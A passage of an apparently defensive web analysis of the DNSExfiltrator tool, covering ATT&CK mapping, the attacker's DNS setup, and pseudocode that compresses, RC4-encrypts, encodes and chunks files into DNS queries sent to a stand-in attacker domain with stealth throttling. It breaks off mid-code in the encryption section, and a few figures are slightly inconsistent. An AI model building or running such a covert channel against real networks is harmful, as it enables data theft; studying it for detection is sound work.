<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DNSExfiltrator Deep Analysis - TCPWave Security Knowledge Base</title>
    <style>
        :root {
            --bg-primary: #0d1117;
            --bg-secondary: #161b22;
            --bg-tertiary: #21262d;
            --text-primary: #c9d1d9;
            --text-secondary: #8b949e;
            --accent-blue: #58a6ff;
            --accent-green: #3fb950;
            --accent-red: #f85149;
            --accent-orange: #d29922;
            --accent-purple: #a371f7;
            --accent-cyan: #39c5cf;
            --border-color: #30363d;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Noto Sans', Helvetica, Arial, sans-serif;
            background: var(--bg-primary);
            color: var(--text-primary);
            line-height: 1.6;
            padding: 0;
        }

        .header {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            padding: 40px 20px;
            text-align: center;
            border-bottom: 3px solid var(--accent-red);
            position: relative;
            overflow: hidden;
        }

        .header::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
            opacity: 0.5;
        }

        .header-content {
            position: relative;
            z-index: 1;
        }

        .header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            color: #fff;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }

        .header .subtitle {
            font-size: 1.2em;
            color: var(--accent-cyan);
            margin-bottom: 15px;
        }

        .classification-banner {
            background: var(--accent-red);
            color: white;
            padding: 8px 20px;
            display: inline-block;
            border-radius: 4px;
            font-weight: bold;
            font-size: 0.9em;
            letter-spacing: 1px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 30px 20px;
        }

        .toc {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 30px;
        }

        .toc h2 {
            color: var(--accent-blue);
            margin-bottom: 15px;
            font-size: 1.3em;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .toc ul {
            list-style: none;
            columns: 2;
            column-gap: 40px;
        }

        .toc li {
            margin-bottom: 8px;
            padding-left: 20px;
            position: relative;
        }

        .toc li::before {
            content: '>';
            position: absolute;
            left: 0;
            color: var(--accent-green);
        }

        .toc a {
            color: var(--text-primary);
            text-decoration: none;
            transition: color 0.2s;
        }

        .toc a:hover {
            color: var(--accent-blue);
        }

        .section {
            background: var(--bg-secondary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 30px;
            margin-bottom: 25px;
        }

        .section h2 {
            color: var(--accent-blue);
            font-size: 1.5em;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid var(--border-color);
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .section h3 {
            color: var(--accent-green);
            font-size: 1.2em;
            margin: 25px 0 15px 0;
        }

        .section h4 {
            color: var(--accent-orange);
            font-size: 1.1em;
            margin: 20px 0 10px 0;
        }

        p {
            margin-bottom: 15px;
            color: var(--text-primary);
        }

        .alert-box {
            padding: 20px;
            border-radius: 6px;
            margin: 20px 0;
            border-left: 4px solid;
        }

        .alert-danger {
            background: rgba(248, 81, 73, 0.1);
            border-color: var(--accent-red);
        }

        .alert-warning {
            background: rgba(210, 153, 34, 0.1);
            border-color: var(--accent-orange);
        }

        .alert-info {
            background: rgba(88, 166, 255, 0.1);
            border-color: var(--accent-blue);
        }

        .alert-success {
            background: rgba(63, 185, 80, 0.1);
            border-color: var(--accent-green);
        }

        .alert-title {
            font-weight: bold;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .code-block {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 6px;
            padding: 20px;
            margin: 15px 0;
            overflow-x: auto;
            font-family: 'Fira Code', 'Consolas', 'Monaco', monospace;
            font-size: 0.9em;
            line-height: 1.5;
        }

        .code-block pre {
            margin: 0;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .code-header {
            background: var(--bg-tertiary);
            padding: 8px 15px;
            border-radius: 6px 6px 0 0;
            font-size: 0.85em;
            color: var(--text-secondary);
            border: 1px solid var(--border-color);
            border-bottom: none;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .code-header + .code-block {
            border-radius: 0 0 6px 6px;
            margin-top: 0;
        }

        .highlight-keyword { color: var(--accent-purple); }
        .highlight-string { color: var(--accent-green); }
        .highlight-comment { color: var(--text-secondary); font-style: italic; }
        .highlight-function { color: var(--accent-blue); }
        .highlight-number { color: var(--accent-orange); }
        .highlight-variable { color: var(--accent-cyan); }

        .diagram-container {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 30px;
            margin: 20px 0;
            text-align: center;
        }

        .ascii-diagram {
            font-family: 'Fira Code', 'Consolas', monospace;
            font-size: 0.85em;
            line-height: 1.4;
            color: var(--accent-cyan);
            text-align: left;
            display: inline-block;
        }

        .flow-diagram {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            justify-content: center;
            align-items: center;
            margin: 20px 0;
        }

        .flow-box {
            background: var(--bg-tertiary);
            border: 2px solid var(--border-color);
            border-radius: 8px;
            padding: 15px 20px;
            min-width: 150px;
            text-align: center;
        }

        .flow-box.victim { border-color: var(--accent-red); }
        .flow-box.dns { border-color: var(--accent-blue); }
        .flow-box.attacker { border-color: var(--accent-purple); }

        .flow-arrow {
            font-size: 2em;
            color: var(--accent-orange);
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            font-size: 0.95em;
        }

        th, td {
            padding: 12px 15px;
            text-align: left;
            border: 1px solid var(--border-color);
        }

        th {
            background: var(--bg-tertiary);
            color: var(--accent-blue);
            font-weight: 600;
        }

        tr:nth-child(even) {
            background: rgba(255, 255, 255, 0.02);
        }

        .tag {
            display: inline-block;
            padding: 3px 10px;
            border-radius: 12px;
            font-size: 0.8em;
            font-weight: 500;
        }

        .tag-red { background: rgba(248, 81, 73, 0.2); color: var(--accent-red); }
        .tag-green { background: rgba(63, 185, 80, 0.2); color: var(--accent-green); }
        .tag-blue { background: rgba(88, 166, 255, 0.2); color: var(--accent-blue); }
        .tag-orange { background: rgba(210, 153, 34, 0.2); color: var(--accent-orange); }
        .tag-purple { background: rgba(163, 113, 247, 0.2); color: var(--accent-purple); }

        .grid-2 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }

        .grid-3 {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin: 20px 0;
        }

        .card {
            background: var(--bg-tertiary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 20px;
        }

        .card-title {
            color: var(--accent-blue);
            font-weight: 600;
            margin-bottom: 10px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .metric {
            font-size: 2em;
            font-weight: bold;
            color: var(--accent-green);
        }

        .metric-label {
            font-size: 0.9em;
            color: var(--text-secondary);
        }

        ul, ol {
            margin: 15px 0 15px 25px;
        }

        li {
            margin-bottom: 8px;
        }

        .mitre-technique {
            background: var(--bg-tertiary);
            border-left: 3px solid var(--accent-purple);
            padding: 15px;
            margin: 10px 0;
            border-radius: 0 6px 6px 0;
        }

        .mitre-id {
            color: var(--accent-purple);
            font-weight: bold;
            font-family: monospace;
        }

        .packet-diagram {
            background: #000;
            border: 1px solid var(--accent-green);
            border-radius: 6px;
            padding: 20px;
            margin: 20px 0;
            font-family: 'Fira Code', monospace;
            font-size: 0.85em;
            overflow-x: auto;
        }

        .packet-header {
            color: var(--accent-cyan);
            border-bottom: 1px dashed var(--accent-green);
            padding-bottom: 10px;
            margin-bottom: 10px;
        }

        .packet-data {
            color: var(--accent-green);
        }

        .packet-label {
            color: var(--accent-orange);
        }

        .timeline {
            position: relative;
            padding-left: 30px;
            margin: 20px 0;
        }

        .timeline::before {
            content: '';
            position: absolute;
            left: 10px;
            top: 0;
            bottom: 0;
            width: 2px;
            background: var(--border-color);
        }

        .timeline-item {
            position: relative;
            margin-bottom: 25px;
            padding-left: 20px;
        }

        .timeline-item::before {
            content: '';
            position: absolute;
            left: -24px;
            top: 5px;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: var(--accent-blue);
            border: 2px solid var(--bg-primary);
        }

        .timeline-title {
            color: var(--accent-blue);
            font-weight: 600;
            margin-bottom: 5px;
        }

        .detection-rule {
            background: #1a1a1a;
            border: 1px solid var(--accent-orange);
            border-radius: 6px;
            padding: 15px;
            margin: 15px 0;
            font-family: monospace;
            font-size: 0.9em;
        }

        .detection-rule-title {
            color: var(--accent-orange);
            font-weight: bold;
            margin-bottom: 10px;
        }

        .footer {
            background: var(--bg-secondary);
            border-top: 1px solid var(--border-color);
            padding: 30px 20px;
            text-align: center;
            margin-top: 40px;
        }

        .footer-logo {
            font-size: 1.5em;
            font-weight: bold;
            color: var(--accent-blue);
            margin-bottom: 10px;
        }

        .footer-text {
            color: var(--text-secondary);
            font-size: 0.9em;
        }

        @media (max-width: 768px) {
            .toc ul {
                columns: 1;
            }
            .grid-2, .grid-3 {
                grid-template-columns: 1fr;
            }
            .header h1 {
                font-size: 1.8em;
            }
        }
    </style>
</head>
<body>

<div class="header">
    <div class="header-content">
        <h1>DNSExfiltrator Deep Technical Analysis</h1>
        <p class="subtitle">Understanding DNS Covert Channel Data Exfiltration</p>
        <div class="classification-banner">SECURITY RESEARCH - DEFENSIVE PURPOSES ONLY</div>
    </div>
</div>

<div class="container">

    <!-- Table of Contents -->
    <div class="toc">
        <h2>Table of Contents</h2>
        <ul>
            <li><a href="#overview">1. Executive Overview</a></li>
            <li><a href="#mitre">2. MITRE ATT&CK Mapping</a></li>
            <li><a href="#architecture">3. Architecture & Components</a></li>
            <li><a href="#protocol">4. DNS Protocol Mechanics</a></li>
            <li><a href="#encoding">5. Data Encoding Techniques</a></li>
            <li><a href="#encryption">6. Encryption Implementation</a></li>
            <li><a href="#doh">7. DNS over HTTPS (DoH) Evasion</a></li>
            <li><a href="#flow">8. Complete Data Flow Analysis</a></li>
            <li><a href="#packet">9. Packet-Level Analysis</a></li>
            <li><a href="#evasion">10. Evasion Techniques</a></li>
            <li><a href="#detection">11. Detection Strategies</a></li>
            <li><a href="#tcpwave">12. TCPWave Detection Capabilities</a></li>
            <li><a href="#indicators">13. Indicators of Compromise</a></li>
            <li><a href="#response">14. Incident Response Playbook</a></li>
        </ul>
    </div>

    <!-- Section 1: Executive Overview -->
    <div class="section" id="overview">
        <h2>1. Executive Overview</h2>

        <div class="alert-box alert-danger">
            <div class="alert-title">Threat Classification</div>
            <p>DNSExfiltrator is a data exfiltration tool that abuses the DNS protocol to create a covert channel for stealing sensitive data from compromised networks. It represents a significant threat because DNS traffic is rarely blocked and often poorly monitored.</p>
        </div>

        <h3>What is DNS Exfiltration?</h3>
        <p>DNS exfiltration is a technique that encodes stolen data within DNS queries and responses. Since DNS is essential for network functionality and is typically allowed through firewalls, it provides an ideal covert channel for attackers to extract data without triggering traditional security controls.</p>

        <div class="grid-3">
            <div class="card">
                <div class="card-title">Attack Vector</div>
                <div class="metric">DNS</div>
                <div class="metric-label">Protocol Abuse</div>
            </div>
            <div class="card">
                <div class="card-title">Data Capacity</div>
                <div class="metric">~189 bytes</div>
                <div class="metric-label">Per DNS Query (max)</div>
            </div>
            <div class="card">
                <div class="card-title">Detection Difficulty</div>
                <div class="metric">HIGH</div>
                <div class="metric-label">Blends with normal traffic</div>
            </div>
        </div>

        <h3>Key Characteristics</h3>
        <table>
            <tr>
                <th>Attribute</th>
                <th>Value</th>
                <th>Security Impact</th>
            </tr>
            <tr>
                <td>Protocol</td>
                <td>DNS (UDP/53, TCP/53, DoH/443)</td>
                <td><span class="tag tag-red">Rarely blocked</span></td>
            </tr>
            <tr>
                <td>Encryption</td>
                <td>RC4 (configurable)</td>
                <td><span class="tag tag-orange">Obfuscates payload</span></td>
            </tr>
            <tr>
                <td>Encoding</td>
                <td>Base64URL / Base32</td>
                <td><span class="tag tag-orange">DNS-safe characters</span></td>
            </tr>
            <tr>
                <td>Throttling</td>
                <td>Configurable delays</td>
                <td><span class="tag tag-red">Evades rate detection</span></td>
            </tr>
            <tr>
                <td>DoH Support</td>
                <td>Google, CloudFlare</td>
                <td><span class="tag tag-red">Bypasses DNS monitoring</span></td>
            </tr>
        </table>
    </div>

    <!-- Section 2: MITRE ATT&CK Mapping -->
    <div class="section" id="mitre">
        <h2>2. MITRE ATT&CK Mapping</h2>

        <p>DNSExfiltrator maps to several MITRE ATT&CK techniques across multiple tactics:</p>

        <div class="mitre-technique">
            <span class="mitre-id">T1048.003</span> - Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol
            <p style="margin-top: 10px; color: var(--text-secondary);">Data exfiltration using DNS queries to encode and transmit stolen files. The DNS protocol is not the primary C2 channel but is used specifically for data theft.</p>
        </div>

        <div class="mitre-technique">
            <span class="mitre-id">T1071.004</span> - Application Layer Protocol: DNS
            <p style="margin-top: 10px; color: var(--text-secondary);">Using DNS for command and control communications. DNSExfiltrator establishes a bidirectional channel using DNS queries (client to server) and DNS responses (server to client for acknowledgment).</p>
        </div>

        <div class="mitre-technique">
            <span class="mitre-id">T1132.001</span> - Data Encoding: Standard Encoding
            <p style="margin-top: 10px; color: var(--text-secondary);">Using Base64URL and Base32 encoding to transform binary data into DNS-safe character sets that can be transmitted as subdomain labels.</p>
        </div>

        <div class="mitre-technique">
            <span class="mitre-id">T1573.001</span> - Encrypted Channel: Symmetric Cryptography
            <p style="margin-top: 10px; color: var(--text-secondary);">RC4 encryption of exfiltrated data using a shared password between client and server, preventing inspection of payload contents.</p>
        </div>

        <div class="mitre-technique">
            <span class="mitre-id">T1572</span> - Protocol Tunneling
            <p style="margin-top: 10px; color: var(--text-secondary);">Tunneling arbitrary file data through the DNS protocol by encoding it within DNS query labels and reconstructing it on the receiving server.</p>
        </div>

        <h3>ATT&CK Navigator View</h3>
        <div class="diagram-container">
            <pre class="ascii-diagram">
TACTIC              TECHNIQUE                               SUB-TECHNIQUE
====================================================================================
Exfiltration        T1048 Exfiltration Over Alt Protocol    T1048.003 Non-C2 Protocol
                          |
                          +---> DNS queries carry encoded file chunks

Command & Control   T1071 Application Layer Protocol        T1071.004 DNS
                          |
                          +---> Bidirectional DNS channel

Defense Evasion     T1132 Data Encoding                     T1132.001 Standard Encoding
                          |
                          +---> Base64URL / Base32 encoding

                    T1573 Encrypted Channel                 T1573.001 Symmetric Crypto
                          |
                          +---> RC4 encryption with password

                    T1572 Protocol Tunneling
                          |
                          +---> File data tunneled through DNS
            </pre>
        </div>
    </div>

    <!-- Section 3: Architecture & Components -->
    <div class="section" id="architecture">
        <h2>3. Architecture & Components</h2>

        <h3>System Architecture Overview</h3>
        <div class="diagram-container">
            <pre class="ascii-diagram">
                    VICTIM NETWORK                              ATTACKER INFRASTRUCTURE
    +------------------------------------------+        +----------------------------------+
    |                                          |        |                                  |
    |  +----------------+                      |        |     +----------------------+     |
    |  |   Victim PC    |                      |        |     |   Attacker Server    |     |
    |  |  (Compromised) |                      |        |     |                      |     |
    |  +-------+--------+                      |        |     |  +----------------+  |     |
    |          |                               |        |     |  |dnsexfiltrator.py|  |     |
    |          | 1. File to exfiltrate         |        |     |  | (DNS Server)   |  |     |
    |          v                               |        |     |  +-------+--------+  |     |
    |  +-------+--------+                      |        |     |          ^           |     |
    |  | DNSExfiltrator |                      |        |     |          |           |     |
    |  |    Client      |                      |        |     |  Reassemble file     |     |
    |  | (.exe/.ps1/.js)|                      |        |     |  from DNS queries    |     |
    |  +-------+--------+                      |        |     +----------+-----------+     |
    |          |                               |        |                |                 |
    |          | 2. Encode + Encrypt           |        |                |                 |
    |          |    + Chunk data               |        |                |                 |
    |          v                               |        |                |                 |
    |  +-------+--------+                      |        |                |                 |
    |  |  DNS Queries   |                      |        |                |                 |
    |  | [encoded].domain.com                  |        |                |                 |
    |  +-------+--------+                      |        |                |                 |
    |          |                               |        |                |                 |
    +----------|-------------------------------+        +----------------|------------------+
               |                                                         |
               |     3. DNS Query: abc123.mydomain.com                   |
               +-------------------------------------------------------->|
               |                                                         |
               |<--------------------------------------------------------+
               |     4. DNS Response (ACK)                               |
               |

    ATTACKER'S DNS SETUP:
    ====================
    Domain: mydomain.com
    NS Record: ns1.mydomain.com -> Attacker's Server IP

    All DNS queries for *.mydomain.com are sent to attacker's server
            </pre>
        </div>

        <h3>Component Details</h3>

        <div class="grid-2">
            <div class="card">
                <div class="card-title">Client Components (Victim Side)</div>
                <table>
                    <tr>
                        <th>Component</th>
                        <th>Purpose</th>
                    </tr>
                    <tr>
                        <td><code>dnsExfiltrator.exe</code></td>
                        <td>Compiled C# Windows executable</td>
                    </tr>
                    <tr>
                        <td><code>Invoke-DNSExfiltrator.ps1</code></td>
                        <td>PowerShell wrapper for .NET assembly</td>
                    </tr>
                    <tr>
                        <td><code>dnsExfiltrator.js</code></td>
                        <td>JScript version via DotNetToJScript</td>
                    </tr>
                </table>
            </div>

            <div class="card">
                <div class="card-title">Server Component (Attacker Side)</div>
                <table>
                    <tr>
                        <th>Component</th>
                        <th>Purpose</th>
                    </tr>
                    <tr>
                        <td><code>dnsexfiltrator.py</code></td>
                        <td>Python DNS server using dnslib</td>
                    </tr>
                    <tr>
                        <td>Domain Name</td>
                        <td>Attacker-controlled domain</td>
                    </tr>
                    <tr>
                        <td>NS Record</td>
                        <td>Points to attacker's server</td>
                    </tr>
                </table>
            </div>
        </div>

        <h3>Client Execution Flow</h3>
        <div class="code-header">
            <span>C# - Core Processing Logic (Pseudocode)</span>
            <span class="tag tag-blue">dnsExfiltrator.cs</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-comment">// 1. Read file and compress</span>
<span class="highlight-keyword">byte[]</span> fileBytes = File.ReadAllBytes(inputFile);
<span class="highlight-keyword">byte[]</span> compressed = Compress(fileBytes);  <span class="highlight-comment">// GZip compression</span>

<span class="highlight-comment">// 2. Encrypt with RC4 if password provided</span>
<span class="highlight-keyword">if</span> (!string.IsNullOrEmpty(password)) {
    compressed = RC4.Encrypt(compressed, password);
}

<span class="highlight-comment">// 3. Encode to DNS-safe format</span>
<span class="highlight-keyword">string</span> encoded;
<span class="highlight-keyword">if</span> (useBase32) {
    encoded = Base32.Encode(compressed);
} <span class="highlight-keyword">else</span> {
    encoded = Base64Url.Encode(compressed);  <span class="highlight-comment">// URL-safe Base64</span>
}

<span class="highlight-comment">// 4. Calculate chunk sizes based on DNS limits</span>
<span class="highlight-keyword">int</span> maxLabelSize = <span class="highlight-number">63</span>;      <span class="highlight-comment">// DNS label limit</span>
<span class="highlight-keyword">int</span> maxRequestSize = <span class="highlight-number">255</span>;   <span class="highlight-comment">// Total FQDN limit</span>
<span class="highlight-keyword">int</span> domainLength = domain.Length;
<span class="highlight-keyword">int</span> availableBytes = maxRequestSize - domainLength - <span class="highlight-number">10</span>;  <span class="highlight-comment">// -10 for dots and metadata</span>

<span class="highlight-comment">// 5. Split encoded data into chunks</span>
<span class="highlight-keyword">List</span>&lt;<span class="highlight-keyword">string</span>&gt; chunks = SplitIntoChunks(encoded, availableBytes, maxLabelSize);

<span class="highlight-comment">// 6. Send first packet with metadata (filename, total size)</span>
<span class="highlight-keyword">string</span> initQuery = $"init.{fileName}.{totalSize}.{totalChunks}.{domain}";
SendDnsQuery(initQuery);

<span class="highlight-comment">// 7. Send each chunk as a DNS query</span>
<span class="highlight-keyword">for</span> (<span class="highlight-keyword">int</span> i = <span class="highlight-number">0</span>; i &lt; chunks.Count; i++) {
    <span class="highlight-keyword">string</span> query = $"{chunks[i]}.{i}.{domain}";
    SendDnsQuery(query);

    <span class="highlight-comment">// Optional throttling for stealth</span>
    <span class="highlight-keyword">if</span> (throttleTime > <span class="highlight-number">0</span>) {
        Thread.Sleep(throttleTime);
    }
}</pre>
        </div>
    </div>

    <!-- Section 4: DNS Protocol Mechanics -->
    <div class="section" id="protocol">
        <h2>4. DNS Protocol Mechanics</h2>

        <h3>DNS Query Structure Exploitation</h3>
        <p>DNSExfiltrator exploits the hierarchical structure of DNS domain names to embed data within subdomain labels:</p>

        <div class="diagram-container">
            <pre class="ascii-diagram">
NORMAL DNS QUERY:
=================
    www.example.com
    [label1].[label2].[TLD]

EXFILTRATION DNS QUERY:
=======================
    SGVsbG8gV29ybGQh.0.mydomain.com
    [encoded_data].[chunk_num].[attacker_domain]

    Where:
    - SGVsbG8gV29ybGQh = Base64URL encoded data chunk
    - 0 = Chunk sequence number
    - mydomain.com = Attacker-controlled domain

DNS LABEL CONSTRAINTS:
=====================
    - Each label: MAX 63 characters
    - Total FQDN: MAX 255 characters
    - Valid chars: a-z, A-Z, 0-9, hyphen (-)
    - Base64URL adds: underscore (_)
    - Base32: A-Z, 2-7 only (case-insensitive)
            </pre>
        </div>

        <h3>DNS Query Types Used</h3>
        <table>
            <tr>
                <th>Query Type</th>
                <th>Usage</th>
                <th>Why Chosen</th>
            </tr>
            <tr>
                <td><code>A</code></td>
                <td>Default query type</td>
                <td>Most common, least suspicious</td>
            </tr>
            <tr>
                <td><code>TXT</code></td>
                <td>Can carry more data in response</td>
                <td>Used for larger payloads in C2 response</td>
            </tr>
            <tr>
                <td><code>AAAA</code></td>
                <td>IPv6 address queries</td>
                <td>Alternative to avoid A record filtering</td>
            </tr>
        </table>

        <h3>Maximum Data Per Query Calculation</h3>
        <div class="code-block">
<pre><span class="highlight-comment">// DNS Limits</span>
<span class="highlight-variable">FQDN_MAX_LENGTH</span>     = <span class="highlight-number">255</span> bytes (total domain name)
<span class="highlight-variable">LABEL_MAX_LENGTH</span>    = <span class="highlight-number">63</span>  bytes (each subdomain segment)
<span class="highlight-variable">MIN_LABELS</span>          = <span class="highlight-number">2</span>   (at least domain.tld)

<span class="highlight-comment">// Calculation for mydomain.com (13 chars)</span>
<span class="highlight-variable">Available</span> = <span class="highlight-number">255</span> - <span class="highlight-number">13</span> (domain) - <span class="highlight-number">1</span> (dot) - <span class="highlight-number">10</span> (metadata/safety)
<span class="highlight-variable">Available</span> = <span class="highlight-number">231</span> bytes

<span class="highlight-comment">// With multiple labels (63 chars each)</span>
<span class="highlight-variable">Labels needed</span> = ceil(<span class="highlight-number">231</span> / <span class="highlight-number">63</span>) = <span class="highlight-number">4</span> labels
<span class="highlight-variable">Actual capacity</span> = <span class="highlight-number">4</span> * <span class="highlight-number">63</span> - <span class="highlight-number">3</span> (dots) = <span class="highlight-number">249</span> chars

<span class="highlight-comment">// With Base64 encoding (33% overhead)</span>
<span class="highlight-variable">Raw bytes per query</span> = <span class="highlight-number">249</span> * <span class="highlight-number">0.75</span> = ~<span class="highlight-number">187</span> bytes

<span class="highlight-comment">// With Base32 encoding (60% overhead)</span>
<span class="highlight-variable">Raw bytes per query</span> = <span class="highlight-number">249</span> * <span class="highlight-number">0.625</span> = ~<span class="highlight-number">155</span> bytes</pre>
        </div>
    </div>

    <!-- Section 5: Data Encoding Techniques -->
    <div class="section" id="encoding">
        <h2>5. Data Encoding Techniques</h2>

        <h3>Base64URL Encoding</h3>
        <p>Default encoding method that converts binary data to DNS-safe characters:</p>

        <div class="code-header">
            <span>Base64URL Character Set</span>
            <span class="tag tag-green">Standard Encoding</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-comment">// Standard Base64 alphabet</span>
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/

<span class="highlight-comment">// Base64URL modifications for DNS compatibility</span>
<span class="highlight-keyword">Replace:</span> '+' -> '-'  <span class="highlight-comment">(plus is not DNS-safe)</span>
<span class="highlight-keyword">Replace:</span> '/' -> '_'  <span class="highlight-comment">(slash is not DNS-safe)</span>
<span class="highlight-keyword">Remove:</span>  '='        <span class="highlight-comment">(padding not needed)</span>

<span class="highlight-comment">// Example transformation</span>
<span class="highlight-variable">Original file:</span>    "secret.txt" containing "Hello World!"
<span class="highlight-variable">Compressed:</span>       [GZip compressed bytes]
<span class="highlight-variable">Base64URL:</span>        "H4sIAAAAAAAAA0tMTFZIyS9KSQQAMpjx1goAAAA"

<span class="highlight-comment">// As DNS query:</span>
H4sIAAAAAAAAA0tMTFZIyS9KSQQAMpjx1goAAAA.<span class="highlight-number">0</span>.mydomain.com</pre>
        </div>

        <h3>Base32 Encoding</h3>
        <p>Used when DNS resolvers modify case (Base32 is case-insensitive):</p>

        <div class="code-header">
            <span>Base32 Character Set</span>
            <span class="tag tag-orange">Case-Insensitive</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-comment">// Base32 alphabet (RFC 4648)</span>
ABCDEFGHIJKLMNOPQRSTUVWXYZ234567

<span class="highlight-comment">// Characteristics</span>
- Case insensitive (DNS resolvers can't break it)
- 5 bits per character (vs 6 bits for Base64)
- ~60% size overhead (vs 33% for Base64)
- Automatically enabled for CloudFlare DoH

<span class="highlight-comment">// Example transformation</span>
<span class="highlight-variable">Original:</span>    "Hello World!"
<span class="highlight-variable">Base64URL:</span>  "SGVsbG8gV29ybGQh" (16 chars)
<span class="highlight-variable">Base32:</span>     "JBSWY3DPFQQFO33SNRSCC" (21 chars)

<span class="highlight-comment">// Trade-off</span>
<span class="highlight-variable">Base64URL:</span> More efficient, but case-sensitive
<span class="highlight-variable">Base32:</span>    Less efficient, but guaranteed to work</pre>
        </div>

        <h3>Data Chunking Algorithm</h3>
        <div class="code-header">
            <span>Chunk Creation Logic</span>
            <span class="tag tag-blue">C# Implementation</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-keyword">public static</span> List&lt;<span class="highlight-keyword">string</span>&gt; <span class="highlight-function">CreateDnsLabels</span>(<span class="highlight-keyword">string</span> encodedData, <span class="highlight-keyword">int</span> maxLabelSize, <span class="highlight-keyword">int</span> maxTotalSize) {
    <span class="highlight-keyword">var</span> labels = <span class="highlight-keyword">new</span> List&lt;<span class="highlight-keyword">string</span>&gt;();
    <span class="highlight-keyword">int</span> position = <span class="highlight-number">0</span>;
    <span class="highlight-keyword">int</span> currentTotal = <span class="highlight-number">0</span>;

    <span class="highlight-keyword">while</span> (position &lt; encodedData.Length && currentTotal &lt; maxTotalSize) {
        <span class="highlight-comment">// Calculate remaining space</span>
        <span class="highlight-keyword">int</span> remainingTotal = maxTotalSize - currentTotal - <span class="highlight-number">1</span>; <span class="highlight-comment">// -1 for dot</span>
        <span class="highlight-keyword">int</span> labelSize = Math.Min(maxLabelSize, remainingTotal);
        labelSize = Math.Min(labelSize, encodedData.Length - position);

        <span class="highlight-keyword">if</span> (labelSize <= <span class="highlight-number">0</span>) <span class="highlight-keyword">break</span>;

        <span class="highlight-keyword">string</span> label = encodedData.Substring(position, labelSize);
        labels.Add(label);

        position += labelSize;
        currentTotal += labelSize + <span class="highlight-number">1</span>; <span class="highlight-comment">// +1 for dot separator</span>
    }

    <span class="highlight-keyword">return</span> labels;
}

<span class="highlight-comment">// Example output for "SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBsb25nZXIgdGVzdCBtZXNzYWdl"</span>
<span class="highlight-comment">// with maxLabelSize=63, creates:</span>
<span class="highlight-comment">// ["SGVsbG8gV29ybGQhIFRoaXMgaXMgYSBsb25nZXIgdGVzdCBtZXNzYWdl"]</span>
<span class="highlight-comment">// Single label if under 63 chars</span></pre>
        </div>
    </div>

    <!-- Section 6: Encryption Implementation -->
    <div class="section" id="encryption">
        <h2>6. Encryption Implementation</h2>

        <h3>RC4 Stream Cipher</h3>
        <p>DNSExfiltrator uses RC4 encryption to obfuscate the exfiltrated data. While RC4 is considered weak by modern standards, it serves the purpose of preventing casual inspection:</p>

        <div class="alert-box alert-warning">
            <div class="alert-title">Security Note</div>
            <p>RC4 is deprecated for TLS and other security protocols due to known vulnerabilities. However, for data exfiltration, it provides sufficient obfuscation to evade signature-based detection while keeping implementation simple.</p>
        </div>

        <div class="code-header">
            <span>RC4 Implementation</span>
            <span class="tag tag-purple">Symmetric Encryption</span>
        </div>
        <div class="code-block">
<pre><span class="highlight-keyword">public class</span> <span class="highlight-function">RC4</span> {
    <span class="highlight-keyword">private byte</span>[] S = <span class="highlight-keyword">new byte</span>[<span class="highlight-number">256</span>];
    <span class="highlight-keyword">private int</span> x = <span class="highlight-number">0</span>, y = <span class="highlight-number">0</span>;

    <span class="highlight-keyword">public</span> <span class="highlight-function">RC4</span>(<span class="highlight-keyword">byte</span>[] key) {
        <span class="highlight-comment">// Key Scheduling Algorithm (KSA)</span>
        <span class="highlight-keyword">for</span> (<span class="highlight-keyword">int</span> i = <span class="highlight-number">0</span>; i &lt; <span class="highlight-number">256</span>; i++) {
            S[i] = (<span class="highlight-keyword">byte</span>)i;
        }

        <span class="highlight-keyword">int</span> j = <span class="highlight-number">0</span>;
        <span class="highlight-keyword">for</span> (<span class="highlight-keyword">int</span> i = <span class="highlight-number">0</span>; i &lt; <span class="highlight-number">256</span>; i++) {
            j = (j + S[i] + key[i % key.Length]) % <span class="highlight-number">256</span>;
            <span class="highlight-comment">// Swap S[i] and S[j]</span>
            <span class="highlight-keyword">byte</span> temp = S[i];
